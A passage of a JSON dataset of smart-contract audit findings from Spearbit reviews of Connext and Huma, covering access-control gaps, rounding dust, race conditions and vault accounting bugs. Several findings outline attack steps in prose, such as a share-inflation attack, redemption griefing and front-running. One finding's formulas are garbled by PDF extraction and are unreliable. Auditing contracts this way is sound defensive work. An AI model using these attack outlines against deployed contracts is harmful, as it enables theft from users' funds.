        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Event not emitted when ERC20 and native asset is transferred together to SponsorVault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Any ERC20 token or native asset can be transferred to SponsorVault contract by calling the de- posit() function. It emits a Deposit() event logging the transferred asset and the amount. However, if the native asset and an ERC20 token are transferred in the same call only a single event corresponding to the ERC20 transfer is emitted.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "payable keyword can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "If a function does not need to have the native asset sent to it it is recommended to not mark it as payable and avoid any funds getting. StableSwapFacet.sol has two payable functions: swapExact() and swapExactOut, which only swap ERC20 tokens and are not expected to receive the native asset.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Improve variable naming",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Two different variables/functions with an almost identical name are prone to error. Variable names like _routerOwnershipRenounced and _assetOwnershipRenounced do not correctly reflect their meaning as they actually refer to the ownership whitelist being renounced. 45 function _isRouterOwnershipRenounced() internal view returns (bool) { return LibDiamond.contractOwner() == address(0) || s._routerOwnershipRenounced; } /** * @notice Indicates if the ownership of the asset whitelist has * been renounced */ function _isAssetOwnershipRenounced() internal view returns (bool) { ... bool _routerOwnershipRenounced; ... // 27 bool _assetOwnershipRenounced; The constant EMPTY is defined twice with different values. This is confusing and could lead to errors. contract BaseConnextFacet { ... bytes32 internal constant EMPTY = hex\"c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\"; ... ,! } library LibCrossDomainProperty { ... bytes29 public constant EMPTY = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"; ... } The function xcall() uses both _args.transactingAssetId and transactingAssetId. two, but they each have a very specific meaning and missing it introduces problems. It is easy to mix these function xcall(...) ... { ... address transactingAssetId = _args.transactingAssetId == address(0) ? address(s.wrapper) : _args.transactingAssetId; ... (, uint256 amount) = AssetLogic.handleIncomingAsset( _args.transactingAssetId, ... ); ... (uint256 bridgedAmt, address bridged) = AssetLogic.swapToLocalAssetIfNeeded( ..., transactingAssetId, ... ); ... } In the _handleExecuteTransaction function of BridgeFacet, _args.amount and _amount are used. In this func- tion:  _args.amount is equal to bridged_amount; 46  _amount is equal to bridged_amount - liquidityFee (and potentially swapped amount).",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "onlyRemoteRouter can be circumvented",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "BaseConnextFacet-fix. However, the change has not been applied to Router.sol#L56-L58 which is currently in use. The modifier onlyRemoteRouter() can be mislead if the sender parameter has the value 0. The modifier uses _m.sender() from the received message by Nomad. Assuming all checks of Nomad work as expected this value cannot be 0 as it originates from a msg.sender in Home.sol. contract Replica is Version0, NomadBase { function process(bytes memory _message) public returns (bool _success) { ... bytes29 _m = _message.ref(0); ... // ensure message has been proven bytes32 _messageHash = _m.keccak(); require(acceptableRoot(messages[_messageHash]), \"!proven\"); ... IMessageRecipient(_m.recipientAddress()).handle( _m.origin(), _m.nonce(), _m.sender(), _m.body().clone() ); ... } } contract BridgeRouter is Version0, Router { function handle(uint32 _origin,uint32 _nonce,bytes32 _sender,bytes memory _message) external override onlyReplica onlyRemoteRouter(_origin, _sender) { ... } } abstract contract Router is XAppConnectionClient, IMessageRecipient { ... modifier onlyRemoteRouter(uint32 _origin, bytes32 _router) { require(_isRemoteRouter(_origin, _router), \"!remote router\"); _; } function _isRemoteRouter(uint32 _domain, bytes32 _router) internal view returns (bool) { return remotes[_domain] == _router; // if _router == 0 then this is true for random _domains } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Some dust not accounted for in reconcile()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The function _handleExecuteLiquidity() in BridgeFacet takes care of rounding issues in toSwap / pathLen. However, the inverse function reconcile() in NomadFacet() does not do that. So, tiny amounts of tokens (dust) are not accounted for in reconcile(). contract BridgeFacet is BaseConnextFacet { ... function _handleExecuteLiquidity(...) ... { ... // For each router, assert they are approved, and deduct liquidity. uint256 routerAmount = toSwap / pathLen; for (uint256 i; i < pathLen - 1; ) { s.routerBalances[_args.routers[i]][_args.local] -= routerAmount; unchecked { ++i; } } // The last router in the multipath will sweep the remaining balance to account for remainder ,! dust. uint256 toSweep = routerAmount + (toSwap % pathLen); s.routerBalances[_args.routers[pathLen - 1]][_args.local] -= toSweep; } } } contract NomadFacet is BaseConnextFacet { ... function reconcile(...) ... { ... uint256 routerAmt = toDistribute / pathLen; for (uint256 i; i < pathLen; ) { s.routerBalances[routers[i]][localToken] += routerAmt; unchecked { ++i; } } } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Careful with the decimals of BridgeTokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The BridgeRouter sends token details including the decimals() over the nomad bridge to configure a new deployed token. After setting the hash with setDetailsHash() anyone can call setDetails() on the token to set the details. The decimals() are mainly used for user interfaces so it might not be a large problem when the setDetails() is executed at later point in time. However initializeSwap() also uses decimals(), this is called via offchain code. In the example code of initializeSwap.ts it retrieves the decimals() from the deployed token on the destination chain. This introduces a race condition between setDetails() and initializeSwap.ts, depending on which is executed first, the swaps will have different results. Note: It could also break the ConnextPriceOracle contract BridgeRouter is Version0, Router { ... function _send( ... ) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... // query token contract for details and calculate detailsHash _detailsHash = BridgeMessage.getDetailsHash(_t.name(), _t.symbol(), _t.decimals()); } else { ... } } function _handleTransfer(...) ... { ... if (tokenRegistry.isLocalOrigin(_token)) { ... } else { ... IBridgeToken(_token).setDetailsHash(_action.detailsHash()); // so hash is set now } } } contract BridgeToken is Version0, IBridgeToken, OwnableUpgradeable, ERC20 { ... function setDetails(..., uint8 _newDecimals) ... { // can be called by anyone ... require( _isFirstDetails || BridgeMessage.getDetailsHash(..., _newDecimals) == detailsHash, \"!committed details\" ); ... token.decimals = _newDecimals; ... } } Example script: initializeSwap.ts 49 const decimals = await Promise.all([ (await ethers.getContractAt(\"TestERC20\", local)).decimals(), (await ethers.getContractAt(\"TestERC20\", adopted)).decimals(), // setDetails might not have ,! been done ]); const tx = await connext.initializeSwap(..., decimals, ... ); ); contract SwapAdminFacet is BaseConnextFacet { ... function initializeSwap(..., uint8[] memory decimals, ... ) ... { ... for (uint8 i; i < numPooledTokens; ) { ... precisionMultipliers[i] = 10**uint256(SwapUtils.POOL_PRECISION_DECIMALS - decimals[i]); ... } } }",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect comment about ERC20 approval to zero-address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The linked code notes in a comment: // NOTE: if pool is not registered here, then the approval will fail // as it will approve to the zero-address SafeERC20.safeIncreaseAllowance(IERC20(_assetIn), address(pool), _amount); This is not always true. The ERC20 spec doesnt have this restriction and ERC20 tokens based on solmate also dont revert on approving to zero-address. There is no risk here as the following line of code for zero-address pools will revert. return (pool.swapExact(_amount, _assetIn, _assetOut, minReceived), _assetOut);",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Native asset is delivered even if the wrapped asset is transferred",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "Connext delivers the native asset on the destination chain even if the wrapped asset was transferred. This is because on the source chain the native asset is converted to the wrapped asset, and then the distinction is lost. On the destination chain it is not possible to know which of these two assets was transferred, and hence a choice is made to transfer the native asset. if (_assetId == address(0)) revert AssetLogic__transferAssetFromContract_notNative(); if (_assetId == address(s.wrapper)) { // If dealing with wrapped assets, make sure they are properly unwrapped // before sending from contract s.wrapper.withdraw(_amount); Address.sendValue(payable(_to), _amount); } else { ...",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Entire transfer amount is borrowed from AAVE Portal when a router has insufficient balance",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "If the router picked by the Sequencer doesnt have enough balance to transfer the required amount, it can borrow the entire amount from Aave Portal. For a huge amount, it will block borrowing for other routers since there is a limit on the total maximum amount that can be borrowed.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unused variable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "The variable message is not used after declaration. bytes memory message;",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Incorrect Natspec for adopted and canonical asset mappings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "adoptedToCanonical maps adopted assets to canonical assets, but is described as a \"Mapping of canonical to adopted assets\"; canonicalToAdopted maps canonical assets to adopted assets, but is described as a \"Mapping of adopted to canonical assets\". // /** // * @notice Mapping of canonical to adopted assets on this domain // * @dev If the adopted asset is the native asset, the keyed address will // * be the wrapped asset address // */ // 12 mapping(address => TokenId) adoptedToCanonical; // /** // * @notice Mapping of adopted to canonical on this domain // * @dev If the adopted asset is the native asset, the stored address will be the // * wrapped asset address // */ // 13 mapping(bytes32 => address) canonicalToAdopted;",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use of SafeMath for solc >= 0.8",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Connext-Spearbit-Security-Review.pdf",
        "body": "AmplificationUtils, SwapUtils, ConnextPriceOracle, GovernanceRouter.sol use SafeMath. Since 0.8.0, arithmetic in solidity reverts if it overflows or underflows, hence there is no need to use open- zeppelins SafeMath library.",
        "labels": [
            "Spearbit",
            "Connext",
            "Severity: Informational"
        ]
    },
    {
        "title": "Restriction of transfer can be circumvented by using approve + transferFrom",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "ERC20Upgradeable which includes approve and transferFrom functions that can circumvent this restriction. those inherits from Here are the following issues that may arise through the use of approve + transferFrom: 1. TrancheVault shares, intended only for addresses with the LENDER_ROLE, can be sent to an address without this role. A trustless smart contract can be built to make this functionality available as well. 2. The checkLiquidityRequirementForRedemption check can be bypassed by approving and calling trans- ferFrom() to a new account not associated with poolOwnerTreasury or evaluationAgent, followed by re- deeming these shares. 3. Lender's principal amount can be converted into yield which is readily redeemable, circumventing the re- demption process. This is done by transferring the principal amount from a reinvesting lender's account to a non-reinvesting lender's account. The excess amount is treated as yield by the processYieldForLenders function.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: High Risk"
        ]
    },
    {
        "title": "_getStartOfNextHalfYear does not update year correctly for the second half of the year",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "year is not incremented for the second half of the year when we want to calculate the startOfNex- tHalfYear: (uint256 year, uint256 month, ) = DTL.timestampToDate(timestamp); startOfNextHalfYear = DTL.timestampFromDate(year, month > 6 ? 1 : 7, 1); If month > 6 is true one should also increment the year.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: High Risk"
        ]
    },
    {
        "title": "First loss cover fee investment will fail if it does not exceed minimum deposit amount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Fees are invested in two different ways. Whenever an admin account attempts to withdraw accrued income and alternatively via investFeesInFirstLossCover() which is managed by the pool owner and sentinel service accounts. Until the cover reaches max liquidity, fees will be invested. There is important edge case that is not considered which would cause _investFeesInFirstLossCover() to re- vert, affecting all fee withdrawal functions. When getAvailableCap() < poolSettings.minDepositAmount, then depositCoverFor() will fail and unless cover redeemability is enabled, it will not be possible to withdraw fees because _investFeesInFirstLossCover() will always attempt to deposit an amount that is less than poolSet- tings.minDepositAmount.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lenders can grief other lenders by depositing on their behalf",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Upon depositing into the tranche vault, the deposit() function will check that both the msg.sender and receiver accounts are approved to LP into the tranche. The deposit record keeps track of the principal amount held by the account, and the last deposit timestamp. To redeem tranche shares, the lender must add a redemption request which is only processed at the beginning In an effort to prevent of each new epoch (assuming there is funds available to process all requested shares). depositors from timing their deposits whenever borrowers are due to make repayments, a withdrawal lockout period is enforced within addRedemptionRequest(). Therefore, honest users can have their redemptions blocked by malicious actors if they deposit on their behalf before a new request is created. This resets the withdrawal lockout and can be repeated to prevent all tranche users from exiting. function addRedemptionRequest(uint256 shares) external { // ... // Checks against withdrawal lockup period. DepositRecord memory depositRecord = _getDepositRecord(msg.sender); if ( nextEpochStartTime < depositRecord.lastDepositTime + poolConfig.getLPConfig().withdrawalLockoutPeriodInDays * SECONDS_IN_A_DAY ) revert Errors.WithdrawTooEarly(); // ... Note: fig.getLPConfig().withdrawalLockoutPeriodInDays * SECONDS_IN_A_DAY. for maintaining the attack the cost is poolSettings.minDepositAmount every poolCon-",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Inconsistent FirstLossCover.isSufficient check in PoolFeeManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Admin accounts accrue fees in the PoolFeeManager contract whenever a profit distribution is made. These functions only allow each of the admin accounts to withdraw fees that are in excess of the first loss cover's max liquidity. This check is inconsistently applied across all withdraw functions and proves unnecessary as fees can only be invested via investFeesInFirstLossCover() up until min liquidity is reached. A pool owner or sentinel service account must intervene to ensure fees are invested. removing the sufficient cover checks in withdrawPoolOwnerFee() and",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "First loss cover fee mechanics can be gamified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The first loss cover contracts receive a portion of profits generated by the pool. FLC liquidity is bounded between min and max amounts and any excess yield is processed and paid out as yield to all cover providers via payoutYield(). Because cover can be readily deposited and redeemed, it seems trivial for cover providers to take on no risk by depositing up to maxLiquidity prior to any pool profit distributions and subsequently redeeming their tokens. However, because liquidity is capped, other cover providers may be more willing to take on actual risk. If maxLiq- uidity has been reached, then this gamified deposit/redeem strategy will not longer be possible.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "depositCoverFor does not check if receiver is a cover provider",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "While the depositCoverFor() function is only called by PoolFeeManager contract when investing admin income into the FLC contracts, there is no check to ensure these admin accounts are even cover providers in the first place. In the case where they are not, they will not be eligible for any yield paid out.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_processEpoch should check against minPoolBalanceForRedemption before processing junior tranche token requests",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The minPoolBalanceForRedemption variable is initialized and set to avoid rounding errors when the pool has a low balance. Prior to redeeming senior tranche tokens, this is checked, however, this is not done before processing the junior tranche.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_availableCredits does not get updated when a receivable is burnt or transfered",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "1. In _approveReceivable we have the following invariant enforced: availableCredit <= cc.creditLimit // per borrower 0 (cid:20) r i adv (cid:1) ai (cid:0) bj (cid:20) clim approve X Xdrawdown 2. In _prepareForDrawdown we have the following invariant enforced: amount <= receivable.receivableAmount 3. In _drawdown the following invariant is enforced: bj (cid:20) aj borrowAmount <= (cc.creditLimit - cr.unbilledPrincipal - (cr.nextDue - cr.yieldDue)) 9 bj (cid:20) clim (cid:0) (pun + anext (cid:0) ydue) = clim (cid:0) bi Xi6=j (cid:0)clim + bj (cid:20) r i adv (cid:1) ai approve X Putting all these together we have: - drawdown,i6=k bk - clim (cid:20) bj and P bj (cid:20) min 0 @ aj , clim (cid:0) bi , r i adv (cid:1) ai (cid:0) Xi6=j approve X Xdrawdown,i6=k bk 1 A Now if you get a receivable approved and then burn it and you get another receivable approved the last element in the min function would have a higher value: r i adv (cid:1) ai (cid:0) bk approve X Xdrawdown,i6=k Since in the first sum r i adv (cid:1) ai term from the burnt receivable is still incorporated. This is because when burning a tokenId for a receivable _availableCredits for a borrower does not get up- dated/decreased.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "onERC721Received should revert when protocol is paused or the pool is off",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "onERC721Received does allow receiving NFTs even when the protocol is paused or the pool is off. This is unlike other operational endpoints.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "approveReceivable does not check receivableId to make sure it is not zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The check to make sure receivableInput.receivableId is not 0 is missing.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "setPoolUnderlyingToken does not validate the _underlyingToken",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "setPoolUnderlyingToken does not validate the _underlyingToken.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Only the huma master admin should be allowed to update poolFeeManager in PoolConfig",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "An account with an DEFAULT_ADMIN_ROLE can rewrite poolFeeManager. Pool fee manager is in charge of setting the protocol fee among other fees.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Make sure only the huma master admin can call setHumaConfig",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "An account with a DEFAULT_ADMIN_ROLE can rewrite humaConfig in PoolConfig. But in terms of power structure, this should not be allowed, only the huma master admin should be able to perform this task.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "seniorLoss is not compared to seniorTotalAssets to make sure only the minimum value is sub- tracted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "seniorLoss is not compared to seniorTotalAssets to make sure only the minimum value is sub- tracted.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "setReinvestYield should be restricted to a lender with LENDER_ROLE",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Currently the setReinvestYield endpoint does not have any restrictions as to what lenders are allowed to be supplied by the pool operator. If an account does not have the LENDER_ROLE anymore, pool operator might be mistake try to add them to the nonReinvestingLenders list.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Liquidity checks slightly differ around the edge cases in FirstLossCover.redeemCover",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The two conditional statements for the if blocks in this context slightly vary in their edge cases: if (!ready && currTotalAssets <= minLiquidity) { ... } if (!ready && assets > currTotalAssets - minLiquidity) { ... } The second if block is equivalent to: if (!ready && currTotalAssets - assets < minLiquidity) { ... } The first if block would not allow the operation to be performed even when currTotalAssets == minLiquidity, but the second if block allows the updated total assets to be equal to minLiquidity.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Non-reinvesting Lenders can front-run removal and still in nonReinvestingLenders array",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "There's an issue where a Lender in nonReinvestingLenders can front-run the removeApprovedLen- der() function. By doing this, they can opt-out but still receive yield payouts (at the cost of reduced shares) until setReinvestYield() is called. Hence there is no relevant impact it is still a minor issue.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Be intentional about existence of makeInitialDeposit by restricting deposits from lenders if total- Supply is 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "There is a makeInitialDeposit function that accepts deposits from authorized initial depositors. In a deposit that is meant for all the lenders, this is not enforced by making sure totalSupply is non-zero.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Lenders can perform an inflation attack on the tranche vault",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "While a minimum deposit amount is enforced when an LP deposits assets into the tranche vault, the same user is free to redeem any amount of assets. An inflation attack could then be setup in the following way:  Deposit poolConfig.getPoolSettings().minDepositAmount into the protocol.  Wait poolConfig.getLPConfig().withdrawalLockoutPeriodInDays * SECONDS_IN_A_DAY seconds.  Create a redemption request to redeem all shares except for 1 wei.  Subsequently, wait for a new lender to deposit assets and perform the typical inflation-style attack by front- running the deposit to increase the shares:assets exchange rate, ensuring the victim receives zero shares at the end of their deposit. Note: because the attacker must hope that no other approved lenders deposit assets into the tranche until they have redeemed all of their shares except for 1 wei, this attack is unlikely to be seen.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Uninitialized FirstLossCover in PoolFactory",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The current implementation in PoolFactory.sol involves setting a new FirstLossCover without initializing it within the same transaction. This approach introduces a vulnerability where an uninitialized state can be exploited by frontrunners, potentially leading to a DoS attack on the deployed contract. Furthermore, this could disrupt the intended behavior of the Pool contract, resulting in operational issues or security risks.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Redemption implementation does not match the protocol specification",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The specification outlines that a LP's shares are minted in proportion to their total ownership of shares held by the pool and not the total requested share amount. However, the implementation is of the latter, meaning a lender who holds X shares and desires to redeem only 10% of this amount, can optimise this redemption by requesting to redeem a much more significant amount. This can be readily done prior to an epoch being closed as the available funds to be distributed is already known. Following redemption execution, the same lender can cancel the redemption of any excess shares and will have gamified the redemption process in their favour.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Blacklisted liquidity providers may cause processYieldForLenders to revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Many stablecoins maintain blacklists that frequently block accounts that are suspected of illicit activ- ity. If a non-reinvesting lender is blacklisted, then it is no longer possible to process yield for other non-reinvesting lenders until they are forced to become a reinvesting lender. function processYieldForLenders() external { uint256 len = nonReinvestingLenders.length; uint256 price = convertToAssets(DEFAULT_DECIMALS_FACTOR); uint96[2] memory tranchesAssets = pool.currentTranchesAssets(); for (uint256 i = 0; i < len; i++) { address lender = nonReinvestingLenders[i]; uint256 shares = ERC20Upgradeable.balanceOf(lender); uint256 assets = (shares * price) / DEFAULT_DECIMALS_FACTOR; DepositRecord memory depositRecord = _getDepositRecord(lender); if (assets > depositRecord.principal) { uint256 yield = assets - depositRecord.principal; tranchesAssets[trancheIndex] -= uint96(yield); // Round up the number of shares the lender has to burn in order to receive // the given amount of yield. Round-up applies the favor-the-pool principle. shares = Math.ceilDiv(yield * DEFAULT_DECIMALS_FACTOR, price); ERC20Upgradeable._burn(lender, shares); poolSafe.withdraw(lender, yield); emit YieldPaidOut(lender, yield, shares); } } poolSafe.resetUnprocessedProfit(); pool.updateTranchesAssets(tranchesAssets); }",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "An epoch can be closed before processing a tranche's unprocessed yield, leading to less optimal share redemptions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "The autotask peforms the following tasks regularly:  Fetch all pools where the current epoch endTime is in the past.  Call processYieldForLenders() on the junior and senior tranche.  Call closeEpoch() on the epoch manager contract.  Call investFeesInFirstLossCover() on the pool fee manager contract.  Call payoutYield() on all first loss cover contracts of the pool. While processYieldForLenders() can be called at any time to process any tranche profit and ultimately redeem any yield earned by users who have opted not to reinvest their earnings, there is no guarantee that closeEpoch() is not called before the autotask is able to. As a result, there may be some unprocessed tranche profit which is not accounted for, leading to inefficient epoch processing and less optimal share redemptions.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Edge case for totalAssets can cause divide by zero error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "A borrower can default, causing a decrease in totalAssets (pool.tranchesAssets(index)), with- out a corresponding decrease in totalSupply. This scenario may lead to a situation where the totalSupply of the vault is non-zero while totalAssets is zero. In such a case, no one will be able to deposit, as the _convert- ToShares function will revert with a divide-by-zero error.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inconsistent behavior in makePrincipalPaymentAndDrawdownWithReceivable()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Calling makePrincipalPaymentAndDrawdownWithReceivable() doesn't update the borrower's credit record and due info correctly when paymentAmount == drawdownAmount, unlike calling makePrincipalPaymen- tWithReceivable() and drawdownWithReceivable() separately.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unintended unpausing credit for borrowers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "There's an issue where a borrower, upon having their credit Paused, can resume their credit status to GoodStanding by making a full payment off payoffAmount. Unpausing the credit allows the borrower to have access to further drawdowns, breaking the pausing functionality",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Credit can be reapproved when paused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "Credit is approved by the EA service account which is ultimately delegated by the pool owner. The EA service account may have an account paused and then proceed to reapprove credit for the same account, overwriting sensitive loan data that should otherwise remain untouched until the loan has reached the end of its lifetime. Note: this action would assume some degree of negligence by the EA. Under normal protocol actions, this should not happen.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unsynchronized PoolConfig state variables in interdependent contracts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "In the PoolConfig contract, updates to state variables aren't automatically reflected in other depen- dent contracts. This results in a mismatch, as other contracts continue using outdated values, potentially leading to functional discrepancies and security concerns.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing credit limit check in _updateLimitAndCommitment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
        "body": "There are a number constraints that are enforced when the pool owner approves credit for a bor- rower. However, one of these constraints is not enforced when updating credit limits during a loan's term. One of these includes the poolConfig.getPoolSettings().maxCreditLine >= creditLimit check which ensures no loan credit line exceeds the pool configuration parameters. While _approveCredit() does not allow for setting the initial creditLimit and committedAmount values to zero, there seems to be some legitimate use cases to allow for this within _updateLimitAndCommitment() function. i.e. the pool owner can prevent the borrower from performing any further drawdown. Alternatively, the required committed amount may also be removed, meaning the borrower is not expected to pay yield on any unused funds.",
        "labels": [
            "Spearbit",
            "Huma-2024",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Excess yield paid may be lost when updating a loan's yield",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Huma-2024-Spearbit-Security-Review.pdf",
